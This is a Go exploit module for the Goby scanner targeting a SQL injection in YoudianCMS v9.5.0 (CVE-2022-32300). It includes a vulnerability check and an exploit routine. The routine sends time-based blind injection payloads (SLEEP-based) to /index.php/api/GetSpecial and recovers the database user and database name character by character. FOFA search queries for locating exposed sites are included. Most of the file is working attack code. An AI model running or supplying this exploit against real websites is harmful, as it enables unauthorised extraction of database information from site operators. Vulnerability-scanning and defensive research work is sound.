package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"time"
)

func init() {
	expJson := `{
    "Name": "YoudianCMS v9.5.0 SQL Injection (CVE-2022-32300)",
    "Description": "<p>YouDianCMS is a website CMS.  </p><p>YoudianCMS v9.5.0 version exists security holes, the vulnerability stems from a pass/App/Lib/Action/Admin/MailAction class. PHP MailSendID parameters of SQL injection vulnerabilities are found out. </p>",
    "Product": "Youdian-Website-CMS",
    "Homepage": "http://youdiancms.com/",
    "DisclosureDate": "2022-06-15",
    "Author": "Xsw6a",
    "FofaQuery": "banner=\"X-Powered-By: YoudianCMS\" || header=\"X-Powered-By: YoudianCMS\"",
    "GobyQuery": "banner=\"X-Powered-By: YoudianCMS\" || header=\"X-Powered-By: YoudianCMS\"",
    "Level": "2",
    "Impact": "Able to read some sensitive files through SQL injection vulnerability.",
    "Recommendation": "<p>At present, the manufacturer has not issued any repair measures to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's home page or reference website for solutions at any time:  </p><p><a href=\"http://www.youdiancms.com/\">http://www.youdiancms.com/</a> </p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "createSelect",
            "value": "SqlPoint,USER(),DATABASE()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2022-32300"
    ],
    "CNNVD": [
        "CNNVD-202206-1482"
    ],
    "CNVD": [],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "YoudianCMS v9.5.0 sql注入（CVE-2022-32300）",
            "Product": "友点建站-CMS",
            "Description": "<p>YouDianCMS是一个网站CMS。</p><p>YoudianCMS v9.5.0版本存在安全漏洞，该漏洞源于通过/App/Lib/Action/Admin/MailAction.class.php处的MailSendID参数发现存在SQL注入漏洞。</p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：</p><p><a target=\"_Blank\" href=\"http://www.youdiancms.com/\">http://www.youdiancms.com/</a></p>",
            "Impact": "<p>攻击者通过sql注入漏洞读取数据库用户密码等敏感文件。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "YoudianCMS v9.5.0 SQL Injection (CVE-2022-32300)",
            "Product": "Youdian-Website-CMS",
            "Description": "<p>YouDianCMS is a website CMS.&nbsp;&nbsp;</p><p>YoudianCMS v9.5.0 version exists security holes, the vulnerability stems from a pass/App/Lib/Action/Admin/MailAction class. PHP MailSendID parameters of SQL injection vulnerabilities are found out.&nbsp;</p>",
            "Recommendation": "<p>At present, the manufacturer has not issued any repair measures to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's home page or reference website for solutions at any time:&nbsp;&nbsp;</p><p><a href=\"http://www.youdiancms.com/\">http://www.youdiancms.com/</a>&nbsp;</p>",
            "Impact": "<ul><li><p>Able to read some sensitive files through SQL injection vulnerability.</p></li></ul>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10692"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri2 := "/index.php/api/GetSpecial?ChannelID=1&IdList=1"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			timeUnix1 := time.Now().Unix()
			if _, err2 := httpclient.DoHttpRequest(u, cfg2); err2 == nil {
				timeUnix2 := time.Now().Unix()
				fmt.Println(timeUnix2 - timeUnix1)
				if (timeUnix2 - timeUnix1) > 4 {
					return false
				}
				uri := "/index.php/api/GetSpecial?ChannelID=1&IdList=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))A)"
				cfg := httpclient.NewGetRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = true
				timeUnix3 := time.Now().Unix()
				resp, err := httpclient.DoHttpRequest(u, cfg)
				if err == nil && resp.StatusCode == 200 {
					timeUnix4 := time.Now().Unix()
					fmt.Println(timeUnix4 - timeUnix3)
					if (timeUnix4 - timeUnix3 - (timeUnix2 - timeUnix1)) > 4 {
						return true
					}
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var m string = ""
			if ss.Params["AttackType"].(string) == "SqlPoint" {
				uri2 := "/index.php/api/GetSpecial?ChannelID=1&IdList=1"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				timeUnix1 := time.Now().Unix()
				if _, err2 := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err2 == nil {
					timeUnix2 := time.Now().Unix()
					fmt.Println(timeUnix2 - timeUnix1)
					if (timeUnix2 - timeUnix1) > 4 {
						return expResult
					}
					uri := "/index.php/api/GetSpecial?ChannelID=1&IdList=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))A)"
					cfg := httpclient.NewGetRequestConfig(uri)
					cfg.VerifyTls = false
					cfg.FollowRedirect = true
					timeUnix3 := time.Now().Unix()
					resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					if err == nil && resp.StatusCode == 200 {
						timeUnix4 := time.Now().Unix()
						fmt.Println(timeUnix4 - timeUnix3)
						if (timeUnix4 - timeUnix3 - (timeUnix2 - timeUnix1)) > 4 {
							expResult.Success = true
							expResult.Output = "Sqlmap： " + expResult.HostInfo.FixedHostInfo + "/index.php/api/GetSpecial?ChannelID=1&IdList=1 \n\nTime Blind Injection"
						}
					}
				}
			} else if ss.Params["AttackType"].(string) == "USER()" {
				for j := 1; j <= 20; j++ {
					for i := 1; i <= 128; i++ {
						a := "/index.php/api/GetSpecial?ChannelID=1&IdList=1)%20AND%20(SELECT%208430%20FROM%20(SELECT(SLEEP(5-(IF(ORD(MID((IFNULL(CAST(USER()%20AS%20NCHAR)%2C0x20))%2C"
						a = a + strconv.Itoa(j) + "%2C1))%3D" + strconv.Itoa(i) + "%2C0%2C5)))))Qatj)%20AND%20(1989%3D1989"
						uri := a
						cfg := httpclient.NewGetRequestConfig(uri)
						cfg.VerifyTls = false
						cfg.FollowRedirect = true
						timeUnix := time.Now().Unix()
						resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
						if err == nil && resp.StatusCode == 200 {
							timeUnix1 := time.Now().Unix()
							if (timeUnix1 - timeUnix) > 4 {
								m = m + string(i)
							}
						}
					}
				}
				if len(m) > 0 {
					expResult.Success = true
					expResult.Output = "当前用户为:" + m
				}
			} else if ss.Params["AttackType"].(string) == "DATABASE()" {
				for j := 1; j <= 20; j++ {
					for i := 1; i <= 128; i++ {
						a := "/index.php/api/GetSpecial?ChannelID=1&IdList=1)%20AND%20(SELECT%208430%20FROM%20(SELECT(SLEEP(5-(IF(ORD(MID((IFNULL(CAST(DATABASE()%20AS%20NCHAR)%2C0x20))%2C"
						a = a + strconv.Itoa(j) + "%2C1))%3D" + strconv.Itoa(i) + "%2C0%2C5)))))Qatj)%20AND%20(1989%3D1989"
						uri := a
						cfg := httpclient.NewGetRequestConfig(uri)
						cfg.VerifyTls = false
						cfg.FollowRedirect = true
						timeUnix := time.Now().Unix()
						resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
						if err == nil && resp.StatusCode == 200 {
							timeUnix1 := time.Now().Unix()
							if (timeUnix1 - timeUnix) > 4 {
								m = m + string(i)
							}
						}
					}
				}
				if len(m) > 0 {
					expResult.Success = true
					expResult.Output = "当前数据库为:" + m
				}
			} else {
				expResult.Output = "Automatic exploitation failed, please try manual exploitation!"
				expResult.Success = false
			}
			return expResult
		},
	))
}

//http://www.youdiancms.com/
//https://jinglinad.com/
